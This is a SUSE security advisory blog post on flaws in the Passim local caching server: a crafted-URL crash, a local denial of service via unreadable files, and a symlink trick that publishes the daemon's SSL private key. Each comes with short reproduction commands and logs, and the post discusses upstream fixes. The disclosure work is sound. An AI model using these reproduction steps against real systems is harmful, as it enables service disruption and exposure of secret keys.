---
layout: post
author: <a href='mailto:matthias.gerstner@suse.de'>Matthias Gerstner</a>
title:  "Security Issues in Passim Local Caching Server"
date:   2023-10-27 15:25:00 +0100
tags:   local
excerpt: "This is a report about findings in the Passim local caching server. Passim is a relatively new project for a local caching server that helps
distributing publicly available files in local networks to save network bandwidth."
---

This is a report about findings in the [Passim local caching
server][passim-repo].

1) Introduction
===============

Passim is a relatively new project for a local caching server that helps
distributing publicly available files in local networks to save network
bandwidth. It is a dependency of new [fwupd][fwupd-repo] releases, which is
why it has come to our attention.

Passim consists of a daemon component running as a separate passim user
and group. The daemon offers a local D-Bus interface over which only the
root user may publish or unpublish files on the network. Non-root users
may only inspect the available items via D-Bus.

Furthermore the daemon announces all cached items via the Ahavi
discovery protocol. For retrieval of individual items a small libsoup
based HTTP server is integrated into the daemon, listening on port
25000.

A small command line programm `passim` allows to interact with the
daemon's D-Bus interface.

The findings in this report are based on the [upstream release tag
0.1.3][passim-release].

2) Findings
===========

2.1) Remote DoS Against `passimd` by Triggering NULL Pointer Dereference
------------------------------------------------------------------------

When accessing a URL different from the root "/" and without passing any
parameters "?" then a segmentation fault is the result in
[passim-server.c:751][null-pointer-crash-line] (null pointer dereference,
because there is no request).

Example:

    root# curl -v -k 'https://localhost:27500/myfile'
    root# journalctl -u passim.service | tail -n 5
    Oct 25 12:45:24 mybox passimd[5091]: accepting HTTP/1.1 GET /myfile  from ::1:39278 (loopback)
    Oct 25 12:45:24 mybox passimd[5091]: g_strsplit: assertion 'string != NULL' failed
    Oct 25 12:45:29 mybox systemd[1]: passim.service: Main process exited, code=dumped, status=11/SEGV
    Oct 25 12:45:29 mybox systemd[1]: passim.service: Failed with result 'core-dump'.

Upstream has library settings in effect to abort on failing assertions
instead of trying to continue, to prevent possible memory access errors
from becoming exploitable.

This issue is fixed via upstream [commit 1f7bcea][fix-null-pointer].

2.2) Serving Static Files from a Directory owned by Unprivileged Users
----------------------------------------------------------------------

Passim supports the configuration of static directories on the local
file system, whose content will be processed and published upon startup.

Consider a directory controlled by 'nobody':

    root# cat /etc/passim.d/nobody.conf
    [passim]
    Path=/var/lib/nobody/passim

There's two things that I found problematic in such a scenario.

### a) Placing Inaccessible Files in the Directory

    root# sudo -u nobody -g nobody /bin/bash
    nobody$ mkdir /var/lib/nobody/passim
    nobody$ touch /var/lib/nobody/passim/somefile
    nobody$ chmod 000 /var/lib/nobody/passim/somefile

This will prevent future starts of `passimd`:

    root# systemctl restart passim.service
    Job for passim.service failed because the control process exited with error code.
    See "systemctl status passim.service" and "journalctl -xeu passim.service" for details.
    root# journalctl -u passim.service | tail -n 6
    Oct 25 12:56:58 mybox passimd[5330]: scanning /var/lib/nobody/passim
    Oct 25 12:56:58 mybox passimd[5330]: failed to scan sysconfpkg directory: Error opening file /var/lib/nobody/passim/somefile: Permission denied
    Oct 25 12:56:58 mybox systemd[1]: passim.service: Main process exited, code=exited, status=1/FAILURE
    Oct 25 12:56:58 mybox systemd[1]: passim.service: Failed with result 'exit-code'.
    Oct 25 12:56:58 mybox systemd[1]: Failed to start Local Caching Server.

This opens a local DoS attack vector against passimd for the unprivileged user
that owns the directory. This is also valid for other situations like a FIFO
placed there, broken symlinks or symlinks to inaccessible locations as well as
race conditions (time of `readdir()` vs. time of `open()`).

This has at least partially been addressed by upstream [commit
f4c34bd3][fix-eperm].

### b) Placing Symlinks to Otherwise Inaccessible Data in the Directory

Although `passimd` runs with low privileges by default there are some
interesting files that a local attacker might want to get their hands
on. Since `passimd` follows symlinks in this directory one could try to
"publish" files from `/proc/<pidof passimd>` by placing symlinks. This is
somewhat difficult though, since a race condition has to be won (the PID
of a starting `passimd` needs to be known to place a proper symlink).
Also there are not that many interesting files in there I believe. Also e.g.
`/proc/<pid>/mem` cannot be shared this way, since it cannot be read
sequentially.

A much simpler attack is to publish the SSL private key of `passimd` though:

    root# sudo -u nobody -g nobody /bin/bash
    nobody$ mkdir /var/lib/nobody/passim
    nobody$ ln -s /var/lib/passim/secret.key /var/lib/nobody/passim/secret

    root# systemctl restart passim.service
    root# passim dump
    passimd is running
    1c69e7e4d7b7ed655eafa94942a5ef04f7c7688a0519be387133176154f58fe6 secret size:2.5 kB

    root# sha256sum /var/lib/passim/secret.key
    1c69e7e4d7b7ed655eafa94942a5ef04f7c7688a0519be387133176154f58fe6  /var/lib/passim/secret.key

From here on the local attacker can simply download the now shared
"secret key" from localhost.

It has to be noted that this SSL private key has no security purpose in
passimd but only serves to prevent network traffic security scanners
from raising alarm over unencrypted traffic.

Thus currently there is no known information leak using this attack that
has attacker value. It is still crossing of a security boundary and
could be problematic in the future.

Upstream [issue #26][issue-privkey] deals with this issue but is not yet
completely fixed, due to a remaining race condition.

Bugfix Release and Upstream Reporting
=====================================

I reported these issues to the upstream author on 2023-10-25. No
coordinated disclosure was desired so bugfixes have been and still are
developed publicly over the GitHub issue tracker.

There are some disagreements with upstream about whether these issues
are qualifying as security issues. I believe they are. Due to this no
CVEs have been assigned as of now.

Passim is packaged, to my knowledge, in Fedora Linux and Arch Linux
already. Otherwise it should not be widespread.

Upstream is working on a new release of Passim containing fixes for
these and some other non-security issues that I reported as well.

References
==========

- [Passim GitHub repository][passim-repo]
- [Fwupd GitHub repository][fwupd-repo]
- [Passim Release Tag 0.1.3][passim-release]
- [Passim NULL pointer dereference source code location][null-pointer-crash-line]
- [Passim NULL pointer dereference bugfix][fix-null-pointer]
- [Passim bugfix to be robust against EPERM errors][fix-eperm]
- [Passim issue report about the possibility to leak the SSL private key][issue-privkey]

[passim-repo]: https://github.com/hughsie/passim
[passim-release]: https://github.com/hughsie/passim/tree/0.1.3
[fwupd-repo]: https://github.com/fwupd/fwupd
[null-pointer-crash-line]: https://github.com/hughsie/passim/blob/0.1.3/src/passim-server.c#L751
[fix-null-pointer]: https://github.com/hughsie/passim/commit/1f7bceae08beb31d81719e7aa0cb3ff14aba6804
[fix-eperm]: https://github.com/hughsie/passim/commit/4cba26103daab69aedf584ae3a69ba48f4c34bd3
[issue-privkey]: https://github.com/hughsie/passim/issues/26
